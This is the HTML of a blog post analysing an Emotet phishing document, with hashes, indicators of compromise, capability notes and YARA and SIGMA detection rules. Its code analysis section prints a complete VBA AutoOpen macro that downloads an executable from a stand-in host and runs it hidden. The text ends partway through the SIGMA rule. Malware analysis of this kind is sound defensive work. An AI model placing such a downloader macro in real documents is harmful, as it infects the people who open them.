<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=35527&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Emotet Analysis | BlueGates</title>
<meta name="keywords" content="malware, analysis, hunin, blue team">
<meta name="description" content="Executive Summary Emotet is a sophisticated banking trojan that has evolved into a modular malware distribution platform. This analysis reveals its multi-stage infection process, advanced evasion techniques, and ability to deliver additional payloads like TrickBot and Ryuk ransomware. The sample shows significant improvements in anti-analysis capabilities compared to earlier variants.
Threat Level: Critical
Family: Emotet
Aliases: Heodo, Feodo
Discovered: Initially 2014, this variant from January 2023
Platform: Windows
Sample Information Attribute Value File Name invoice_29381.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:35527/posts/emotet-analysis/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:35527/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:35527/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:35527/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:35527/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:35527/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:35527/posts/emotet-analysis/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:35527/" accesskey="h" title="BlueGates (Alt + H)">BlueGates</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:35527/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:35527/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:35527/posts/" title="Post">
                    <span>Post</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Emotet Analysis
    </h1>
    <div class="post-meta"><span title='2025-03-29 06:18:09 +0700 WIB'>March 29, 2025</span>

</div>
  </header> 
  <div class="post-content"><h2 id="executive-summary">Executive Summary<a hidden class="anchor" aria-hidden="true" href="#executive-summary">#</a></h2>
<p>Emotet is a sophisticated banking trojan that has evolved into a modular malware distribution platform. This analysis reveals its multi-stage infection process, advanced evasion techniques, and ability to deliver additional payloads like TrickBot and Ryuk ransomware. The sample shows significant improvements in anti-analysis capabilities compared to earlier variants.</p>
<p><strong>Threat Level</strong>: Critical<br>
<strong>Family</strong>: Emotet<br>
<strong>Aliases</strong>: Heodo, Feodo<br>
<strong>Discovered</strong>: Initially 2014, this variant from January 2023<br>
<strong>Platform</strong>: Windows</p>
<h2 id="sample-information">Sample Information<a hidden class="anchor" aria-hidden="true" href="#sample-information">#</a></h2>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>File Name</td>
<td>invoice_29381.doc</td>
</tr>
<tr>
<td>File Size</td>
<td>283 KB</td>
</tr>
<tr>
<td>MD5</td>
<td>5d2bfc7ce9f3d69c559daf9f0f95a8b7</td>
</tr>
<tr>
<td>SHA1</td>
<td>7c086c09c2b8322d5f094a59c2d23dec18cfa1fc</td>
</tr>
<tr>
<td>SHA256</td>
<td>a5b68ef45d76d647d80f3134d43c0aee3b099dae63aaa940af59cb7c9e01c847</td>
</tr>
<tr>
<td>File Type</td>
<td>MS Word Document with Malicious Macros</td>
</tr>
<tr>
<td>Compilation Timestamp</td>
<td>N/A (Document)</td>
</tr>
</tbody>
</table>
<h2 id="initial-analysis">Initial Analysis<a hidden class="anchor" aria-hidden="true" href="#initial-analysis">#</a></h2>
<h3 id="distribution-method">Distribution Method<a hidden class="anchor" aria-hidden="true" href="#distribution-method">#</a></h3>
<p>This Emotet sample was distributed through a phishing email campaign with the subject line &ldquo;Outstanding Invoice #29381&rdquo;. The email contained an attachment named &ldquo;invoice_29381.doc&rdquo; which prompts users to enable macros to view the content.</p>
<h3 id="indicators-of-compromise-iocs">Indicators of Compromise (IOCs)<a hidden class="anchor" aria-hidden="true" href="#indicators-of-compromise-iocs">#</a></h3>
<ul>
<li>Files:
<ul>
<li>%TEMP%\invoice_29381.doc</li>
<li>%APPDATA%\Microsoft[random-string].exe</li>
<li>%SYSTEMROOT%\System32\Tasks\Microsoftupdate[random-number]</li>
</ul>
</li>
<li>Registry:
<ul>
<li>HKCU\Software\Microsoft\Office[version]\Word\Security\AccessVBOM = 1</li>
<li>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks[TaskGUID]</li>
</ul>
</li>
<li>Network:
<ul>
<li>Multiple C2 domains (see IOC List section)</li>
</ul>
</li>
<li>Other:
<ul>
<li>Scheduled task creation for persistence</li>
<li>PowerShell obfuscated command execution</li>
</ul>
</li>
</ul>
<h2 id="technical-analysis">Technical Analysis<a hidden class="anchor" aria-hidden="true" href="#technical-analysis">#</a></h2>
<h3 id="capabilities">Capabilities<a hidden class="anchor" aria-hidden="true" href="#capabilities">#</a></h3>
<ul>
<li>Steals banking credentials and financial information</li>
<li>Harvests email credentials</li>
<li>Exfiltrates contact lists for spreading via existing email threads</li>
<li>Downloads and executes additional malware payloads</li>
<li>Establishes persistence via registry and scheduled tasks</li>
<li>Uses encrypted C2 communications</li>
</ul>
<h3 id="code-analysis">Code Analysis<a hidden class="anchor" aria-hidden="true" href="#code-analysis">#</a></h3>
<p>The malicious document contains VBA macros that execute when enabled by the user:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>Sub AutoOpen()
</span></span><span style="display:flex;"><span>    Dim xHttp: Set xHttp <span style="color:#f92672">=</span> CreateObject(<span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>)
</span></span><span style="display:flex;"><span>    Dim bStrm: Set bStrm <span style="color:#f92672">=</span> CreateObject(<span style="color:#e6db74">&#34;Adodb.Stream&#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    myURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hxxp://compromised-server.com/payload.bin&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    xHttp<span style="color:#f92672">.</span>Open <span style="color:#e6db74">&#34;GET&#34;</span>, myURL, False
</span></span><span style="display:flex;"><span>    xHttp<span style="color:#f92672">.</span>Send
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    With bStrm
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>Type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>Open
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>write xHttp<span style="color:#f92672">.</span>responseBody
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">.</span>savetofile Environ(<span style="color:#e6db74">&#34;TEMP&#34;</span>) <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">emp_&#34;</span> <span style="color:#f92672">&amp;</span> RandomString(<span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;.exe&#34;</span>, <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    End With
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    Shell Environ(<span style="color:#e6db74">&#34;TEMP&#34;</span>) <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">emp_&#34;</span> <span style="color:#f92672">&amp;</span> RandomString(<span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;.exe&#34;</span>, vbHide
</span></span><span style="display:flex;"><span>End Sub
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Function RandomString(Length As Integer)
</span></span><span style="display:flex;"><span>    Dim i As Integer, Temp As <span style="color:#a6e22e">String</span>
</span></span><span style="display:flex;"><span>    For i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> To Length
</span></span><span style="display:flex;"><span>        Temp <span style="color:#f92672">=</span> Temp <span style="color:#f92672">&amp;</span> Chr(Int((<span style="color:#ae81ff">90</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> Rnd <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>))
</span></span><span style="display:flex;"><span>    Next i
</span></span><span style="display:flex;"><span>    RandomString <span style="color:#f92672">=</span> Temp
</span></span><span style="display:flex;"><span>End Function
</span></span></code></pre></td></tr></table>
</div>
</div><p>The macro downloads a binary payload from a compromised website and executes it. This first-stage loader then:</p>
<ol>
<li>Decrypts and injects the main Emotet module into a legitimate Windows process</li>
<li>Uses API hooking to evade detection</li>
<li>Establishes persistence through a scheduled task</li>
</ol>
<h3 id="anti-analysis-techniques">Anti-Analysis Techniques<a hidden class="anchor" aria-hidden="true" href="#anti-analysis-techniques">#</a></h3>
<ul>
<li>Heavily obfuscated code with junk functions and string encryption</li>
<li>Detects virtual machines by checking for VM-specific registry keys, files, and processes</li>
<li>Employs timing checks to detect debugging environments</li>
<li>Uses process injection to hide in legitimate Windows processes</li>
<li>Implements anti-sandbox techniques including human interaction checks</li>
</ul>
<h3 id="network-communications">Network Communications<a hidden class="anchor" aria-hidden="true" href="#network-communications">#</a></h3>
<ul>
<li>Protocol: Custom over HTTP/HTTPS</li>
<li>Encryption: Custom encryption using RC4 with dynamic keys</li>
<li>C2 Infrastructure: Uses a tiered botnet architecture with multiple fallback servers
<ul>
<li>Primary C2 domains are rotated frequently</li>
<li>Communications include system information, task requests, and data exfiltration</li>
<li>Uses a domain generation algorithm (DGA) as a backup communication method</li>
</ul>
</li>
</ul>
<h2 id="mitigation--remediation">Mitigation &amp; Remediation<a hidden class="anchor" aria-hidden="true" href="#mitigation--remediation">#</a></h2>
<h3 id="detection">Detection<a hidden class="anchor" aria-hidden="true" href="#detection">#</a></h3>
<p><strong>YARA Rule:</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>rule Emotet_Doc_Macro_2023 {
</span></span><span style="display:flex;"><span>    meta:
</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Detects Emotet malicious document with macros&#34;</span>
</span></span><span style="display:flex;"><span>        author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Beta Blue Gate&#34;</span>
</span></span><span style="display:flex;"><span>        date <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2023-01-15&#34;</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    strings:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>header <span style="color:#f92672">=</span> { D0 CF <span style="color:#ae81ff">11</span> E0 A1 B1 <span style="color:#ae81ff">1</span>A E1 }  <span style="color:#f92672">//</span> OLE document header
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>macro1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AutoOpen&#34;</span> ascii nocase
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>macro2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Document_Open&#34;</span> ascii nocase
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>download <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span> ascii nocase
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>download2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Adodb.Stream&#34;</span> ascii nocase
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>suspicious1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Shell&#34;</span> ascii nocase
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>suspicious2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Environ(&#34;</span> ascii nocase
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>suspicious3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.savetofile&#34;</span> ascii nocase
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    condition:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">$</span>header at <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span>
</span></span><span style="display:flex;"><span>        ((<span style="color:#f92672">$</span>macro1 <span style="color:#f92672">or</span> <span style="color:#f92672">$</span>macro2) <span style="color:#f92672">and</span>
</span></span><span style="display:flex;"><span>        (<span style="color:#f92672">$</span>download <span style="color:#f92672">or</span> <span style="color:#f92672">$</span>download2) <span style="color:#f92672">and</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span> of (<span style="color:#f92672">$</span>suspicious<span style="color:#f92672">*</span>))
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>SIGMA Rule:</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">title</span>: <span style="color:#ae81ff">Emotet Document Macro Execution</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">id</span>: <span style="color:#ae81ff">5a3293ac-5277-4413-8772-57c43b2f3cc3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">status</span>: <span style="color:#ae81ff">experimental</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">description</span>: <span style="color:#ae81ff">Detects the execution pattern of Emotet document macros</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">author</span>: <span style="color:#ae81ff">Beta Blue Gate</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">date</span>: <span style="color:#ae81ff">2023</span><span style="color:#ae81ff">/01/15</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">logsource</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">product</span>: <span style="color:#ae81ff">windows</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">service</span>: <span style="color:#ae81ff">sysmon</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">detection</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selection</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">EventID</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Image|endswith</span>: 
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\WINWORD.EXE&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\excel.exe&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">CommandLine|contains</span>: <span style="color:#e6db74">&#39;/Automation&#39;</span>
